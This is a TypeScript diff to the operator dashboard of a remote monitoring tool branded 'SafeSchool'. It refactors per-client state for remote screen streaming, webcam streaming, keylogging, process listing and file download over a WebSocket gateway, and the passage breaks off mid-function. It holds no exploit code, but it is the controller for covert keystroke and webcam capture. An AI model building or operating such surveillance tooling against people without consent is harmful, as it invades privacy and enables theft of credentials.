@@ -8,6 +8,21 @@ interface Client {
     status: "online" | "offline";
     lastSeen: number;
     name?: string;
+    // Persistent Data
+    keylogs: string;
+    logs: string[];
+    processes: Process[];
+    apps: AppInfo[];  // Per-client app list
+    // Persistent Feature State
+    state: {
+        monitor: "idle" | "starting" | "active" | "stopping";
+        webcam: "idle" | "starting" | "active" | "stopping";
+        keylogger: "idle" | "starting" | "active" | "stopping";
+    };
+    // Per-client streaming resources (browser-like tabs)
+    jmuxerScreen?: any;
+    jmuxerWebcam?: any;
+    videoContainerId?: string;
 }
 
 interface Process {
@@ -29,27 +44,10 @@ let clients: Map<number, Client> = new Map();
 let activeClientId: number | null = null;
 let wsClient: GatewayWsClient;
 
-// Streaming State
-// Streaming State
-let jmuxerScreen: any = null;
-let jmuxerWebcam: any = null;
-
-// Button State Management
-type ButtonState = "idle" | "starting" | "active" | "stopping";
-interface StreamStates {
-    monitor: ButtonState;
-    webcam: ButtonState;
-    keylogger: ButtonState;
-}
-let streamStates: StreamStates = {
-    monitor: "idle",
-    webcam: "idle",
-    keylogger: "idle"
-};
+// NOTE: Global JMuxers removed - now using per-client JMuxers stored in Client object
 
 // Process Manager State
-let currentProcesses: Process[] = [];
-let currentAppList: AppInfo[] = []; // Moved here
+let currentAppList: AppInfo[] = [];
 let processSearchTerm: string = "";
 let processAutoRefreshInterval: any = null;
 
@@ -78,12 +76,12 @@ const elProcessListBody = document.getElementById("process-list-body")!;
 const chkSelectAll = document.getElementById("chk-select-all-procs") as HTMLInputElement;
 
 // --- Config ---
-const WS_URL = "ws://192.168.1.69:8080"; // Ubuntu VM IP (Bridge Mode)
+const WS_URL = "ws://localhost:8080"; // Gateway on Windows Docker
 
 // --- Initialization ---
 console.log("🚀 SafeSchool Dashboard Initializing...");
 
-initJMuxers();
+// NOTE: initJMuxers() removed - JMuxers are now created per-client
 initWebSocket();
 initEvents();
 
@@ -106,21 +104,25 @@ function initWebSocket() {
         onBackendFrame: (ev) => {
             addOrUpdateClient(ev.backendId, "online");
 
-            // Handle Video & Binary (Multiplexed)
-            if (ev.kind === "binary" && activeClientId === ev.backendId) {
+            // Get the specific client
+            const c = clients.get(ev.backendId);
+            if (!c) return;
+
+            // Handle Video & Binary - ALWAYS feed to client's own JMuxer (background decoding)
+            if (ev.kind === "binary") {
                 if (!ev.payload || ev.payload.byteLength === 0) return;
 
                 const view = new DataView(ev.payload);
                 const type = view.getUint8(0);
 
-                // STRICT CHECK: Drop frames if mode doesn't match
                 if (type === 0x01) { // Screen
-                    if (jmuxerScreen && streamStates.monitor !== "idle") {
-                       jmuxerScreen.feed({ video: new Uint8Array(ev.payload.slice(1)) });
+                    // Feed to THIS CLIENT's JMuxer (continues even when hidden)
+                    if (c.state.monitor !== "idle" && c.jmuxerScreen) {
+                       c.jmuxerScreen.feed({ video: new Uint8Array(ev.payload.slice(1)) });
                     }
                 } else if (type === 0x02) { // Webcam
-                    if (jmuxerWebcam && streamStates.webcam !== "idle") {
-                       jmuxerWebcam.feed({ video: new Uint8Array(ev.payload.slice(1)) });
+                    if (c.state.webcam !== "idle" && c.jmuxerWebcam) {
+                       c.jmuxerWebcam.feed({ video: new Uint8Array(ev.payload.slice(1)) });
                     }
                 } else if (type === 0x03) {
                     // File Download: [0x03][4B len][Name][Bytes]
@@ -140,12 +142,12 @@ function initWebSocket() {
                     URL.revokeObjectURL(url);
                     console.log("📥 Downloaded:", fileName);
                 }
-            } else if (ev.kind === "jpeg" && activeClientId === ev.backendId) {
+            } else if (ev.kind === "jpeg") {
                 // Fallback for MJPEG if needed
                 console.warn("Received JPEG, but expecting H.264");
             }
 
-            // Handle Text Responses
+            // Handle Text Responses (ALWAYS process, even if background)
             if (ev.kind === "text") {
                 handleBackendText(ev.backendId, ev.text);
             }
@@ -158,23 +160,7 @@ function initWebSocket() {
     wsClient.connect(WS_URL);
 }
 
-function initJMuxers() {
-    jmuxerScreen = new JMuxer({
-        node: 'monitor-video',
-        mode: 'video',
-        flushingTime: 0,
-        fps: 30,
-        debug: true
-    });
-
-    jmuxerWebcam = new JMuxer({
-        node: 'webcam-video',
-        mode: 'video',
-        flushingTime: 0,
-        fps: 15,
-        debug: true
-    });
-}
+// NOTE: initJMuxers function removed - JMuxers are now created per-client in initClientVideoResources()
 
 function discoverBackends() {
     if (wsClient.isConnected()) wsClient.sendText(0, "ping");
@@ -183,11 +169,76 @@ function discoverBackends() {
 
 // --- Logic ---
 
+// Initialize per-client video resources (browser-like tabs)
+function initClientVideoResources(c: Client) {
+    const containerId = `client-video-container-${c.id}`;
+    c.videoContainerId = containerId;
+
+    // Check if container already exists
+    if (document.getElementById(containerId)) return;
+
+    // Create container with video elements for this client
+    const container = document.createElement("div");
+    container.id = containerId;
+    container.className = "client-video-container";
+    container.style.display = "none"; // Hidden by default
+    container.innerHTML = `
+        <video id="monitor-video-${c.id}" class="client-monitor-video" autoplay muted></video>
+        <video id="webcam-video-${c.id}" class="client-webcam-video" autoplay muted></video>
+    `;
+
+    // Append to a hidden container in the DOM
+    let hiddenContainer = document.getElementById("hidden-video-containers");
+    if (!hiddenContainer) {
+        hiddenContainer = document.createElement("div");
+        hiddenContainer.id = "hidden-video-containers";
+        hiddenContainer.style.cssText = "position: absolute; width: 1px; height: 1px; overflow: hidden; opacity: 0; pointer-events: none;";
+        document.body.appendChild(hiddenContainer);
+    }
+    hiddenContainer.appendChild(container);
+
+    // Create JMuxers for this client
+    c.jmuxerScreen = new JMuxer({
+        node: `monitor-video-${c.id}`,
+        mode: 'video',
+        flushingTime: 0,
+        fps: 30,
+        debug: false
+    });
+
+    c.jmuxerWebcam = new JMuxer({
+        node: `webcam-video-${c.id}`,
+        mode: 'video',
+        flushingTime: 0,
+        fps: 15,
+        debug: false
+    });
+
+    console.log(`📺 Initialized video resources for Client #${c.id}`);
+}
+
 function addOrUpdateClient(id: number, status: "online" | "offline") {
     let c = clients.get(id);
     if (!c) {
-        c = { id, status, lastSeen: Date.now() };
+        c = {
+            id,
+            status,
+            lastSeen: Date.now(),
+            keylogs: "",
+            logs: [],
+            processes: [],
+            apps: [],
+            state: {
+                monitor: "idle",
+                webcam: "idle",
+                keylogger: "idle"
+            }
+        };
         clients.set(id, c);
+
+        // Initialize per-client video resources
+        initClientVideoResources(c);
+
         renderClientList();
     } else {
         c.status = status;
@@ -219,63 +270,205 @@ function renderClientList() {
 }
 
 function setActiveClient(id: number | null) {
+    if (activeClientId === id) return; // No change
+
     activeClientId = id;
     renderClientList(); // Update active class
 
     // Clear old interval
     if (processAutoRefreshInterval) clearInterval(processAutoRefreshInterval);
 
+    // Get main video elements (always visible in UI)
+    const mainMonitorVideo = document.getElementById("monitor-video") as HTMLVideoElement;
+    const mainWebcamVideo = document.getElementById("webcam-video") as HTMLVideoElement;
+
     if (!id) {
         elViewHome.style.display = "flex";
         elViewClient.style.display = "none";
         elHeaderClientName.textContent = "Overview";
+
+        // Clear main videos when no client selected
+        if (mainMonitorVideo) {
+            mainMonitorVideo.srcObject = null;
+            mainMonitorVideo.src = "";
+        }
+        if (mainWebcamVideo) {
+            mainWebcamVideo.srcObject = null;
+            mainWebcamVideo.src = "";
+        }
         return;
     }
 
     const c = clients.get(id);
-    elHeaderClientName.textContent = c?.name || `Client #${id}`;
+    if (!c) return;
+
+    elHeaderClientName.textContent = c.name || `Client #${id}`;
     elViewHome.style.display = "none";
     elViewClient.style.display = "grid";
 
-    // Stop previous streams
-    stopActiveStreams();
+    // === BROWSER-LIKE TAB SWITCH: Swap video sources ===
+    // Get this client's hidden video elements
+    const clientMonitorVideo = document.getElementById(`monitor-video-${id}`) as HTMLVideoElement;
+    const clientWebcamVideo = document.getElementById(`webcam-video-${id}`) as HTMLVideoElement;
 
-    // Start Auto-Refresh (5s)
-    refreshProcessList(); // Initial fetch
-    processAutoRefreshInterval = setInterval(() => refreshProcessList(), 5000);
+    // Swap: Copy srcObject from client's hidden video to main visible video
+    if (clientMonitorVideo && mainMonitorVideo) {
+        if (clientMonitorVideo.srcObject) {
+            mainMonitorVideo.srcObject = clientMonitorVideo.srcObject;
+        } else {
+            // Fallback: capture stream from client's video
+            try {
+                const stream = (clientMonitorVideo as any).captureStream?.() || (clientMonitorVideo as any).mozCaptureStream?.();
+                if (stream) mainMonitorVideo.srcObject = stream;
+            } catch (e) {
+                console.warn("Could not capture stream, using direct src copy");
+                mainMonitorVideo.src = clientMonitorVideo.src;
+            }
+        }
+    }
+
+    if (clientWebcamVideo && mainWebcamVideo) {
+        if (clientWebcamVideo.srcObject) {
+            mainWebcamVideo.srcObject = clientWebcamVideo.srcObject;
+        } else {
+            try {
+                const stream = (clientWebcamVideo as any).captureStream?.() || (clientWebcamVideo as any).mozCaptureStream?.();
+                if (stream) mainWebcamVideo.srcObject = stream;
+            } catch (e) {
+                console.warn("Could not capture stream, using direct src copy");
+                mainWebcamVideo.src = clientWebcamVideo.src;
+            }
+        }
+    }
+
+    // Restore Keylogs
+    const keylogFeed = document.getElementById("keylog-feed");
+    if (keylogFeed) {
+        keylogFeed.innerText = c.keylogs;
+        keylogFeed.scrollTop = keylogFeed.scrollHeight;
+    }
+
+    // Restore Process List (from cache - instant display)
+    renderProcessListForClient(c);
+
+    // Restore App List (from cache - instant display)
+    renderApplications(c.apps);
+
+    // Restore Button States
+    updateUIForClientState(c);
+
+    // REQUEST ACTUAL STATE FROM BACKEND (for sync after page refresh)
+    wsClient.sendText(id, "get_state");
+
+    // Start Auto-Refresh (UI polling) - request fresh data
+    wsClient.sendText(id, "list_process");
+    wsClient.sendText(id, "list_apps");
+    processAutoRefreshInterval = setInterval(() => {
+        if (activeClientId === id) {
+            wsClient.sendText(id, "list_process");
+            wsClient.sendText(id, "list_apps");
+        }
+    }, 5000);
 }
 
-function stopActiveStreams() {
-    if (activeClientId) {
-        if (streamStates.monitor === "active" || streamStates.monitor === "starting") {
-             wsClient.sendText(activeClientId, "stop_monitor_stream");
-        }
-        if (streamStates.webcam === "active" || streamStates.webcam === "starting") {
-             wsClient.sendText(activeClientId, "stop_webcam_stream");
-        }
+function updateUIForClientState(c: Client) {
+    // === Monitor Button ===
+    switch (c.state.monitor) {
+        case "starting":
+            btnStreamScreen.textContent = "Starting...";
+            btnStreamScreen.classList.remove("btn-destructive", "btn-primary");
+            btnStreamScreen.classList.add("btn-warning");
+            btnStreamScreen.disabled = true;
+            break;
+        case "active":
+            btnStreamScreen.textContent = "Stop Stream";
+            btnStreamScreen.classList.remove("btn-primary", "btn-warning");
+            btnStreamScreen.classList.add("btn-destructive");
+            btnStreamScreen.disabled = false;
+            break;
+        case "stopping":
+            btnStreamScreen.textContent = "Stopping...";
+            btnStreamScreen.classList.remove("btn-destructive", "btn-primary");
+            btnStreamScreen.classList.add("btn-warning");
+            btnStreamScreen.disabled = true;
+            break;
+        default: // idle
+            btnStreamScreen.textContent = "Start Stream";
+            btnStreamScreen.classList.remove("btn-destructive", "btn-warning");
+            btnStreamScreen.classList.add("btn-primary");
+            btnStreamScreen.disabled = false;
     }
 
-    // Force clear buffered frames by mode
-    if (jmuxerScreen) {
-         jmuxerScreen.reset();
-         jmuxerScreen.feed({ video: new Uint8Array(0) });
-    }
-    if (jmuxerWebcam) {
-         jmuxerWebcam.reset();
-         jmuxerWebcam.feed({ video: new Uint8Array(0) });
+    // === Webcam Button ===
+    switch (c.state.webcam) {
+        case "starting":
+            btnStreamWebcam.textContent = "Starting...";
+            btnStreamWebcam.classList.remove("btn-destructive", "btn-success");
+            btnStreamWebcam.classList.add("btn-warning");
+            btnStreamWebcam.disabled = true;
+            break;
+        case "active":
+            btnStreamWebcam.textContent = "Stop Cam";
+            btnStreamWebcam.classList.remove("btn-success", "btn-warning");
+            btnStreamWebcam.classList.add("btn-destructive");
+            btnStreamWebcam.disabled = false;
+            break;
+        case "stopping":
+            btnStreamWebcam.textContent = "Stopping...";
+            btnStreamWebcam.classList.remove("btn-destructive", "btn-success");
+            btnStreamWebcam.classList.add("btn-warning");
+            btnStreamWebcam.disabled = true;
+            break;
+        default: // idle
+            btnStreamWebcam.textContent = "Start Cam";
+            btnStreamWebcam.classList.remove("btn-destructive", "btn-warning");
+            btnStreamWebcam.classList.add("btn-success");
+            btnStreamWebcam.disabled = false;
     }
 
-    // Reset UI
-    streamStates.monitor = "idle";
-    streamStates.webcam = "idle";
-
-    btnStreamScreen.textContent = "Start Stream";
-    btnStreamScreen.classList.remove("btn-destructive");
-    btnStreamWebcam.textContent = "Start Cam";
-    btnStreamWebcam.classList.remove("btn-destructive");
+    // === Keylogger Button ===
+    const elKeylogStatus = document.getElementById("keylog-status")!;
+    switch (c.state.keylogger) {
+        case "starting":
+            btnKeylogToggle.textContent = "Starting...";
+            btnKeylogToggle.classList.remove("btn-destructive");
+            btnKeylogToggle.classList.add("btn-warning");
+            btnKeylogToggle.disabled = true;
+            elKeylogStatus.textContent = "Starting...";
+            elKeylogStatus.style.color = "var(--neon-yellow)";
+            break;
+        case "active":
+            btnKeylogToggle.textContent = "Disable Keylogger";
+            btnKeylogToggle.classList.remove("btn-warning");
+            btnKeylogToggle.classList.add("btn-destructive");
+            btnKeylogToggle.disabled = false;
+            elKeylogStatus.textContent = "Recording...";
+            elKeylogStatus.style.color = "var(--neon-green)";
+            break;
+        case "stopping":
+            btnKeylogToggle.textContent = "Stopping...";
+            btnKeylogToggle.classList.remove("btn-destructive");
+            btnKeylogToggle.classList.add("btn-warning");
+            btnKeylogToggle.disabled = true;
+            elKeylogStatus.textContent = "Stopping...";
+            elKeylogStatus.style.color = "var(--neon-yellow)";
+            break;
+        default: // idle
+            btnKeylogToggle.textContent = "Enable Keylogger";
+            btnKeylogToggle.classList.remove("btn-destructive", "btn-warning");
+            btnKeylogToggle.disabled = false;
+            elKeylogStatus.textContent = "Stopped";
+            elKeylogStatus.style.color = "var(--muted)";
+    }
 }
 
 function handleBackendText(id: number, text: string) {
+    // 1. Get Client Model
+    let c = clients.get(id);
+    if (!c) {
+        c = addOrUpdateClient(id, "online");
+    }
+
     // === STATE SYNC PROTOCOL ===
     if (text.startsWith("STATUS:SYNC:")) {
         const syncPart = text.substring(12); // Remove "STATUS:SYNC:"
@@ -286,75 +479,19 @@ function handleBackendText(id: number, text: string) {
 
         switch (feature) {
             case "monitor":
-                if (isActive) {
-                    streamStates.monitor = "active";
-                    btnStreamScreen.textContent = "Stop Stream";
-                    btnStreamScreen.classList.add("btn-destructive");
-                    btnStreamScreen.classList.remove("btn-primary");
-
-                    // Initialize JMuxer if not already active
-                    if (!jmuxerScreen) {
-                        jmuxerScreen = new JMuxer({
-                            node: "monitor-video",
-                            mode: "video",
-                            flushingTime: 0,
-                            fps: 30,
-                            debug: false,
-                        });
-                    }
-                } else {
-                    streamStates.monitor = "idle";
-                    btnStreamScreen.textContent = "Start Stream";
-                    btnStreamScreen.classList.remove("btn-destructive");
-                    btnStreamScreen.classList.add("btn-primary");
-                }
+                c.state.monitor = isActive ? "active" : "idle";
                 break;
-
             case "webcam":
-                if (isActive) {
-                    streamStates.webcam = "active";
-                    btnStreamWebcam.textContent = "Stop Cam";
-                    btnStreamWebcam.classList.add("btn-destructive");
-                    btnStreamWebcam.classList.remove("btn-success");
-
-                    // Initialize JMuxer if not already active
-                    if (!jmuxerWebcam) {
-                        jmuxerWebcam = new JMuxer({
-                            node: "webcam-video",
-                            mode: "video",
-                            flushingTime: 0,
-                            fps: 30,
-                            debug: false,
-                        });
-                    }
-                } else {
-                    streamStates.webcam = "idle";
-                    btnStreamWebcam.textContent = "Start Cam";
-                    btnStreamWebcam.classList.remove("btn-destructive");
-                    btnStreamWebcam.classList.add("btn-success");
-                }
+                c.state.webcam = isActive ? "active" : "idle";
                 break;
-
             case "keylogger":
-                if (isActive) {
-                    streamStates.keylogger = "active";
-                    btnKeylogToggle.textContent = "Disable Keylogger";
-                    btnKeylogToggle.classList.add("btn-danger");
-                    btnKeylogToggle.classList.remove("btn-warning");
-                    btnKeylogToggle.disabled = false;
-                } else {
-                    streamStates.keylogger = "idle";
-                    btnKeylogToggle.textContent = "Enable Keylogger";
-                    btnKeylogToggle.classList.remove("btn-danger");
-                    btnKeylogToggle.classList.add("btn-warning");
-                    btnKeylogToggle.disabled = false;
-                }
+                c.state.keylogger = isActive ? "active" : "idle";
                 break;
-
             case "complete":
                 console.log("✅ State sync complete!");
                 break;
         }
+        if (activeClientId === id) updateUIForClientState(c);
         return;
     }
 
@@ -363,97 +500,66 @@ function handleBackendText(id: number, text: string) {
         const [_, feature, state] = text.split(":");
 
         if (feature === "MONITOR_STREAM") {
-            if (state === "STARTING") {
-                streamStates.monitor = "starting";
-                // UI already updated by button click
-            } else if (state === "STARTED") {
-                streamStates.monitor = "active";
-                btnStreamScreen.textContent = "Stop Stream";
-                btnStreamScreen.classList.add("btn-destructive");
-                btnStreamScreen.disabled = false;
-            } else if (state === "STOPPED") {
-                streamStates.monitor = "idle";
-                btnStreamScreen.textContent = "Start Stream";
-                btnStreamScreen.classList.remove("btn-destructive");
-                btnStreamScreen.disabled = false;
-            }
+            if (state === "STARTING") c.state.monitor = "starting";
+            else if (state === "STARTED") c.state.monitor = "active";
+            else if (state === "STOPPED") c.state.monitor = "idle";
         } else if (feature === "WEBCAM_STREAM") {
-            if (state === "STARTING") {
-                streamStates.webcam = "starting";
-            } else if (state === "STARTED") {
-                streamStates.webcam = "active";
-                btnStreamWebcam.textContent = "Stop Cam";
-                btnStreamWebcam.classList.add("btn-destructive");
-                btnStreamWebcam.disabled = false;
-            } else if (state === "STOPPED") {
-                streamStates.webcam = "idle";
-                btnStreamWebcam.textContent = "Start Cam";
-                btnStreamWebcam.classList.remove("btn-destructive");
-                btnStreamWebcam.disabled = false;
-            }
+             if (state === "STARTING") c.state.webcam = "starting";
+            else if (state === "STARTED") c.state.webcam = "active";
+            else if (state === "STOPPED") c.state.webcam = "idle";
         } else if (feature === "KEYLOGGER") {
-            const btnKeylogToggle = document.getElementById("btn-keylog-toggle") as HTMLButtonElement;
-            const btnKeylogDownload = document.getElementById("btn-keylog-download") as HTMLButtonElement;
-            const elKeylogStatus = document.getElementById("keylog-status")!;
-
-            if (state === "STARTING") {
-                streamStates.keylogger = "starting";
-            } else if (state === "STARTED") {
-                streamStates.keylogger = "active";
-                btnKeylogToggle.textContent = "Disable Keylogger";
-                btnKeylogToggle.classList.add("btn-destructive");
-                btnKeylogToggle.disabled = false;
-                btnKeylogDownload.disabled = false;
-                elKeylogStatus.textContent = "Recording...";
-                elKeylogStatus.style.color = "var(--neon-green)";
-            } else if (state === "STOPPED") {
-                streamStates.keylogger = "idle";
-                btnKeylogToggle.textContent = "Enable Keylogger";
-                btnKeylogToggle.classList.remove("btn-destructive");
-                btnKeylogToggle.disabled = false;
-                elKeylogStatus.textContent = "Stopped";
-                elKeylogStatus.style.color = "var(--muted)";
-            }
+             if (state === "STARTING") c.state.keylogger = "starting";
+            else if (state === "STARTED") c.state.keylogger = "active";
+            else if (state === "STOPPED") c.state.keylogger = "idle";
         }
-        return; // Don't process as normal text
+
+        // If this client is currently visible, update UI
+        if (activeClientId === id) updateUIForClientState(c);
+        return;
     }
 
     // === ERROR MESSAGE PROTOCOL ===
     if (text.startsWith("ERROR:")) {
         const [_, feature, reason] = text.split(":");
         const friendlyReason = reason.replace(/_/g, " ").toLowerCase();
-        alert(`❌ ${feature.replace(/_/g, " ")}: ${friendlyReason}`);
+        if (activeClientId === id) alert(`❌ ${feature.replace(/_/g, " ")}: ${friendlyReason}`);
 
         // Reset button states on error
         if (feature === "MONITOR_STREAM") {
-            streamStates.monitor = "idle";
-            btnStreamScreen.textContent = "Start Stream";
-            btnStreamScreen.disabled = false;
+            c.state.monitor = "idle";
         } else if (feature === "WEBCAM_STREAM") {
-            streamStates.webcam = "idle";
-            btnStreamWebcam.textContent = "Start Cam";
-            btnStreamWebcam.disabled = false;
+            c.state.webcam = "idle";
         }
+        if (activeClientId === id) updateUIForClientState(c);
         return; // Don't process as normal text
     }
 
-    // === EXISTING MESSAGE HANDLERS ===
-    if (id !== activeClientId) return;
-
+    // === DATA ===
     // Keylogger Data
     if (text.startsWith("KEYLOG: ")) {
         const char = text.substring(8);
-        const feed = document.getElementById("keylog-feed");
-        if (feed) {
-            feed.innerText += char;
-            feed.scrollTop = feed.scrollHeight;
+        c.keylogs += char; // Store persistently
+
+        // Update View if active
+        if (activeClientId === id) {
+            const feed = document.getElementById("keylog-feed");
+            if (feed) {
+                // Append just the new char to avoid flickering or scroll jump,
+                // but checking innerText match is cleaner for now
+                feed.innerText = c.keylogs;
+                feed.scrollTop = feed.scrollHeight;
+            }
         }
     }
-    // Process List response
+    // Process List response (Apps or Procs)
     else if (text.startsWith("DATA:APPS:")) {
          const payload = text.substring(10);
          // Handle empty list
-         if(!payload) { renderApplications([]); return; }
+         if(!payload) {
+             c.apps = [];
+             if (activeClientId === id) renderApplications(c.apps);
+             return;
+         }
 
          const apps: AppInfo[] = payload.split(';').map(item => {
              const parts = item.split('|');
@@ -465,65 +571,85 @@ function handleBackendText(id: number, text: string) {
                  keywords: parts[4] || ""
              };
          });
-         renderApplications(apps);
+
+         // Store per-client
+         c.apps = apps;
+
+         // Only render if this client is active
+         if (activeClientId === id) renderApplications(c.apps);
     }
-    // Process List response
-    else if (text.includes("PID") && text.includes("NAME")) { // Header check
-        console.log("✅ Received Process List response");
-        parseProcessList(text);
+    else if (text.startsWith("DATA:PROCS:") || (text.includes("PID") && text.includes("NAME"))) { // Fallback for old/new format
+         console.log("✅ Received Process List response");
+         if (text.startsWith("DATA:PROCS:")) {
+             parseProcessList(id, text.substring(11));
+         } else if (text.includes("PID")) {
+             // old format, unlikely if Backend updated
+             parseProcessList(id, text); // Pass the whole text for old format parsing
+         }
     }
     // Command feedback
     else if (text.startsWith("OK:")) {
         console.log("Success:", text);
         const msg = text.substring(4);
-        alert("✅ Success: " + msg);
-        const status = document.getElementById("status-message");
-        if(status) status.textContent = "Last Action: " + msg;
-    }
-    else if (text.startsWith("INFO: NAME=")) {
-        const name = text.substring(11).trim();
-        const c = clients.get(id);
-        if (c) {
-            c.name = name;
-            renderClientList();
-            if (activeClientId === id) elHeaderClientName.textContent = name;
+        if (activeClientId === id) {
+            alert("✅ Success: " + msg);
+            const status = document.getElementById("status-message");
+            if(status) status.textContent = "Last Action: " + msg;
         }
     }
+    else if (text.startsWith("INFO:NAME=")) { // Fixed space
+        const name = text.substring(10).trim();
+        c.name = name;
+        renderClientList();
+        if (activeClientId === id) elHeaderClientName.textContent = name;
+    }
     else if (text.startsWith("ERROR:")) {
-        alert("❌ " + text);
+        if (activeClientId === id) alert("❌ " + text);
     }
 }
 
 // --- Process Manager Logic ---
 
-function refreshProcessList() {
-    if (activeClientId) wsClient.sendText(activeClientId, "list_process");
-}
+function parseProcessList(clientId: number, raw: string) {
+    const c = clients.get(clientId);
+    if (!c) return;
 
-function parseProcessList(raw: string) {
-    const lines = raw.split("\n").slice(1);
-    currentProcesses = [];
+    // Format: PID|Name|Icon|Exec|Status;...
+    const items = raw.split(';');
+    c.processes = [];
 
-    lines.forEach(line => {
-        if (!line.trim()) return;
-        const parts = line.trim().split(/\s+/);
-        // Format: PID NAME USER CMD
-        const pid = parts[0];
-        const name = parts[1];
-        const user = parts[2];
-        const cmd = parts.slice(3).join(" ");
+    items.forEach(item => {
+        if (!item.trim()) return;
+        const parts = item.split('|');
+        if (parts.length < 2) { // Fallback for old format (PID NAME USER CMD)
+            const oldParts = item.trim().split(/\s+/);
+            if (oldParts.length >= 2) {
+                c.processes.push({
+                    pid: oldParts[0],
+                    name: oldParts[1],
+                    user: oldParts[2] || "N/A",
+                    cmd: oldParts.slice(3).join(" ") || oldParts[1]
+                });
+            }
+            return;
+        }
 
-        currentProcesses.push({ pid, name, user, cmd });
+        c.processes.push({
+            pid: parts[0],
+            name: parts[1],
+            user: "User", // Placeholder till backend provides it
+            cmd: parts[3] || parts[1]
+        });
     });
 
-    renderProcessList();
+    if (activeClientId === clientId) renderProcessListForClient(c);
 }
 
-function renderProcessList() {
+function renderProcessListForClient(c: Client) {
     elProcessListBody.innerHTML = "";
 
     // Filter
-    const filtered = currentProcesses.filter(p => {
+    const filtered = c.processes.filter(p => {
         if (!processSearchTerm) return true;
         const term = processSearchTerm.toLowerCase();
         return p.name.toLowerCase().includes(term) ||
@@ -554,14 +680,47 @@ function renderProcessList() {
     }
 }
 
-// Debounce Utility
-function debounce(func: Function, wait: number) {
-    let timeout: any;
-    return function (...args: any) {
-        clearTimeout(timeout);
-        timeout = setTimeout(() => func(...args), wait);
-    };
-}
+
+// --- Event Handlers (Updated for State Machine) ---
+
+const handleStreamToggle = (type: 'monitor' | 'webcam' | 'keylogger') => {
+    if (!activeClientId) return;
+    const c = clients.get(activeClientId);
+    if (!c) return;
+
+    if (type === 'monitor') {
+        if (c.state.monitor === 'idle') {
+            c.state.monitor = 'starting';
+            updateUIForClientState(c);
+            wsClient.sendText(activeClientId, "start_monitor_stream");
+        } else if (c.state.monitor === 'active') {
+            c.state.monitor = 'stopping';
+            updateUIForClientState(c);
+            wsClient.sendText(activeClientId, "stop_monitor_stream");
+        }
+    } else if (type === 'webcam') {
+        // Similar for webcam
+        if (c.state.webcam === 'idle') {
+            c.state.webcam = 'starting';
+             updateUIForClientState(c);
+            wsClient.sendText(activeClientId, "start_webcam_stream");
+        } else if (c.state.webcam === 'active') {
+            c.state.webcam = 'stopping';
+             updateUIForClientState(c);
+            wsClient.sendText(activeClientId, "stop_webcam_stream");
+        }
+    } else if (type === 'keylogger') {
+        if (c.state.keylogger === 'idle') {
+            c.state.keylogger = 'starting';
+             updateUIForClientState(c);
+            wsClient.sendText(activeClientId, "start_keylog");
+        } else if (c.state.keylogger === 'active') {
+            c.state.keylogger = 'stopping';
+             updateUIForClientState(c);
+            wsClient.sendText(activeClientId, "stop_keylog");
+        }
+    }
+};
 
 function initEvents() {
     // Theme Toggle
@@ -572,13 +731,13 @@ function initEvents() {
     document.documentElement.setAttribute("data-theme", savedTheme);
     btnThemeToggle.textContent = savedTheme === "dark" ? "🌙" : "☀️";
 
-    btnThemeToggle.onclick = () => {
+    btnThemeToggle.addEventListener("click", () => {
         const current = document.documentElement.getAttribute("data-theme");
         const next = current === "light" ? "dark" : "light";
         document.documentElement.setAttribute("data-theme", next);
         localStorage.setItem("theme", next);
         btnThemeToggle.textContent = next === "dark" ? "🌙" : "☀️";
-    };
+    });
 
     // Auto-ping removed from manual button, but discoverBackends loop still runs.
 
@@ -611,79 +770,19 @@ function initEvents() {
     };
 
     // Fullscreen
-    btnFullscreenScreen.onclick = () => {
+    btnFullscreenScreen.addEventListener("click", () => {
         const el = document.getElementById("monitor-video");
         if (el && el.requestFullscreen) el.requestFullscreen();
-    };
+    });
 
-    // Stream Buttons - STATE MACHINE BASED
-    btnStreamScreen.onclick = () => {
-        if (!activeClientId) return;
+    // Stream Buttons
+    btnStreamScreen.onclick = () => handleStreamToggle('monitor');
+    btnStreamWebcam.onclick = () => handleStreamToggle('webcam');
 
-        if (streamStates.monitor === "idle") {
-            // Start stream
-            streamStates.monitor = "starting";
-            btnStreamScreen.textContent = "Starting...";
-            btnStreamScreen.disabled = true;
-            wsClient.sendText(activeClientId, "start_monitor_stream");
-        } else if (streamStates.monitor === "active") {
-            // Stop stream
-            streamStates.monitor = "stopping";
-            btnStreamScreen.textContent = "Stopping...";
-            btnStreamScreen.disabled = true;
-            wsClient.sendText(activeClientId, "stop_monitor_stream");
-        }
-        // Ignore clicks in "starting" or "stopping" states
-    };
-
-    btnStreamWebcam.onclick = () => {
-        if (!activeClientId) return;
-
-        if (streamStates.webcam === "idle") {
-            // Start webcam
-            streamStates.webcam = "starting";
-            btnStreamWebcam.textContent = "Starting...";
-            btnStreamWebcam.disabled = true;
-            wsClient.sendText(activeClientId, "start_webcam_stream");
-        } else if (streamStates.webcam === "active") {
-            // Stop webcam
-            streamStates.webcam = "stopping";
-            btnStreamWebcam.textContent = "Stopping...";
-            btnStreamWebcam.disabled = true;
-            wsClient.sendText(activeClientId, "stop_webcam_stream");
-        }
-        // Ignore clicks in "starting" or "stopping" states
-    };
-
-    // Keylogger - STATE MACHINE BASED
-    const btnKeylogToggle = document.getElementById("btn-keylog-toggle") as HTMLButtonElement;
+    // Keylogger
+    btnKeylogToggle.onclick = () => handleStreamToggle('keylogger');
     const btnKeylogDownload = document.getElementById("btn-keylog-download") as HTMLButtonElement;
-
-    // Download handler
-    btnKeylogDownload.onclick = () => {
-        if (!activeClientId) return;
-        wsClient.sendText(activeClientId, "get_keylog");
-    };
-
-    // Toggle handler with state machine
-    btnKeylogToggle.onclick = () => {
-        if (!activeClientId) return;
-
-        if (streamStates.keylogger === "idle") {
-            // Start keylogger
-            streamStates.keylogger = "starting";
-            btnKeylogToggle.textContent = "Enabling...";
-            btnKeylogToggle.disabled = true;
-            wsClient.sendText(activeClientId, "start_keylog");
-        } else if (streamStates.keylogger === "active") {
-            // Stop keylogger
-            streamStates.keylogger = "stopping";
-            btnKeylogToggle.textContent = "Disabling...";
-            btnKeylogToggle.disabled = true;
-            wsClient.sendText(activeClientId, "stop_keylog");
-        }
-        // Ignore clicks in "starting" or "stopping" states
-    };
+    btnKeylogDownload.onclick = () => { if(activeClientId) wsClient.sendText(activeClientId, "get_keylog"); };
 
     // Webcam Fullscreen
     const btnFullscreenWebcam = document.getElementById("btn-fullscreen-webcam")!;
@@ -694,33 +793,43 @@ function initEvents() {
 
     // --- Search & Process ---
 
-    const handleSearch = debounce(() => {
-        processSearchTerm = inpSearchProc.value.toLowerCase().trim();
-        renderProcessList();
-
-        // Toggle Clear Button
-        if (processSearchTerm) {
-            btnClearSearch.style.display = "block";
